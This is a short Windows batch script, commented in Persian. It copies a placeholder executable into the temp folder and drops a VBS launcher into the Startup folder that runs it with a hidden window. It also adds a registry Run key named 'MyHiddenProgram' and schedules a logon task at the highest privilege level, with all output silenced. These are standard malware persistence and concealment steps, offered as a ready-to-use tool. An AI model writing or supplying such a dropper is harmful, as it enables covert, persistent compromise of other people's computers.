@echo off
setlocal enabledelayedexpansion

:: نام فایل EXE (تغییر دهید)
set EXE_FILE=your_program.exe

:: مسیرهای مورد نیاز
set TEMP_PATH=%TEMP%\%EXE_FILE%
set STARTUP_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set BATCH_FILE=%STARTUP_PATH%\run_exe.vbs

:: بررسی وجود فایل EXE در مسیر فعلی
if not exist "%EXE_FILE%" (
    exit /b
)

:: کپی کردن فایل به پوشه Temp
copy "%EXE_FILE%" "%TEMP_PATH%" /Y >nul 2>&1

:: ایجاد یک اسکریپت VBS برای اجرای EXE به‌صورت مخفی
(
    echo Set WshShell = CreateObject("WScript.Shell")
    echo WshShell.Run """%TEMP_PATH%""", 0, False
) > "%BATCH_FILE%"

:: بررسی موفقیت‌آمیز بودن ایجاد فایل VBS در Startup
if not exist "%BATCH_FILE%" (
    exit /b
)

:: اضافه کردن به رجیستری برای اجرای خودکار (در صورت غیرفعال بودن Startup)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyHiddenProgram" /t REG_SZ /d "\"%BATCH_FILE%\"" /f >nul 2>&1

:: ایجاد تسک در Task Scheduler برای تضمین اجرا با بالاترین سطح دسترسی
schtasks /create /tn "RunHiddenExeOnStartup" /tr "wscript.exe \"%BATCH_FILE%\"" /sc onlogon /rl highest /f >nul 2>&1

exit
